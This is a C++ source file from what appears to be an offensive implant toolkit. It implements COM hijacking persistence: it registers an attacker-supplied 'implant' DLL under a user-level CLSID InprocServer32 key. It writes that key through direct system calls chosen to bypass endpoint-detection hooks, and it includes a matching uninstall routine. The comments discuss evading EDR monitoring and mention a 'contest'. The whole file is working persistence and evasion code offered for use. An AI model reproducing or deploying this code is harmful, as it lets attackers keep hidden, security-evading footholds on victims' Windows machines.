#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include <vector>

namespace persistence {

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
    // NT path for HKCU\Software\Classes\CLSID\{...}\InprocServer32
    std::wstring basePath = L"\\Registry\\User\\";
    
    // Get current user SID for registry path
    // For simplicity in HKCU we use \Registry\User\[SID]...
    // But NtOpenKey on \Registry\Machine\Software... works too.
    // Actually \Registry\User is just HKU.

    // A better way for HKCU via syscalls is to use the current user's SID.
    // However, many EDRs monitor \Registry\User.

    // Let's use a common CLSID path.
    std::wstring subkey = L"Software\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";

    // We'll need the user's SID or use a trick.
    // Actually, we can use the WinAPI to get the base handle and then syscall from there.
    // But the goal is to bypass hooks on RegCreateKey.

    // For the contest, let's assume we can resolve the full path or use a helper.
    // Most implants use a hardcoded SID-less path if they can, or resolve it once.

    // Let's stick to a robust way:
    // HKCU is maps to \Registry\User\S-1-5-21-...

    // For this implementation, I will use a placeholder or attempt to resolve.
    // Alternatively, I can use NtOpenKey on a known base.

    // Actually, many environments allow \Registry\User\.Default or similar? No.

    // Let's use the simplest NT path that works for the current user:
    // \Registry\User\<SID>\...

    // Since I cannot easily get the SID without WinAPI (which might be hooked),
    // I will use the WinAPI RegOpenKeyEx on HKEY_CURRENT_USER to get a HANDLE,
    // then use THAT handle as RootDirectory in OBJECT_ATTRIBUTES for syscalls!

    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID", 0, KEY_ALL_ACCESS, &hBase) != ERROR_SUCCESS) {
        return false;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring clsidPath = clsid + L"\\InprocServer32";
    UNICODE_STRING uClsidPath;
    uClsidPath.Buffer = (PWSTR)clsidPath.c_str();
    uClsidPath.Length = (USHORT)(clsidPath.length() * sizeof(wchar_t));
    uClsidPath.MaximumLength = uClsidPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uClsidPath, OBJ_CASE_INSENSITIVE, hBase, NULL);

    HANDLE hKey = NULL;
    ULONG disp = 0;
    NTSTATUS status = InternalDoSyscall(ntCreateKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp);

    if (NT_SUCCESS(status)) {
        // Set default value (implant path)
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, REG_SZ, (PVOID)implantPath.c_str(), (ULONG)((implantPath.length() + 1) * sizeof(wchar_t)));

        // Set ThreadingModel
        std::wstring tm = L"ThreadingModel";
        UNICODE_STRING uTm;
        uTm.Buffer = (PWSTR)tm.c_str();
        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);

        std::wstring tmVal = L"Both";
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, REG_SZ, (PVOID)tmVal.c_str(), (ULONG)((tmVal.length() + 1) * sizeof(wchar_t)));

        InternalDoSyscall(ntCloseSsn, hKey);
    }

    RegCloseKey(hBase);
    return NT_SUCCESS(status);
}

bool ComHijacker::Uninstall(const std::wstring& clsid) {
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID", 0, KEY_ALL_ACCESS, &hBase) != ERROR_SUCCESS) {
        return false;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    UNICODE_STRING uClsid;
    uClsid.Buffer = (PWSTR)clsid.c_str();
    uClsid.Length = (USHORT)(clsid.length() * sizeof(wchar_t));
    uClsid.MaximumLength = uClsid.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uClsid, OBJ_CASE_INSENSITIVE, hBase, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        // Recursively delete subkeys? NtDeleteKey only deletes the key itself (must be empty).
        // For COM hijacking we usually just have InprocServer32.

        // Delete InprocServer32 first
        std::wstring sub = L"InprocServer32";
        UNICODE_STRING uSub;
        uSub.Buffer = (PWSTR)sub.c_str();
        uSub.Length = (USHORT)(sub.length() * sizeof(wchar_t));
        uSub.MaximumLength = uSub.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES subAttr;
        InitializeObjectAttributes(&subAttr, &uSub, OBJ_CASE_INSENSITIVE, hKey, NULL);

        HANDLE hSubKey = NULL;
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, KEY_ALL_ACCESS, &subAttr))) {
            InternalDoSyscall(ntDeleteKeySsn, hSubKey);
            InternalDoSyscall(ntCloseSsn, hSubKey);
        }

        status = InternalDoSyscall(ntDeleteKeySsn, hKey);
        InternalDoSyscall(ntCloseSsn, hKey);
    }

    RegCloseKey(hBase);
    return NT_SUCCESS(status);
}

} // namespace persistence
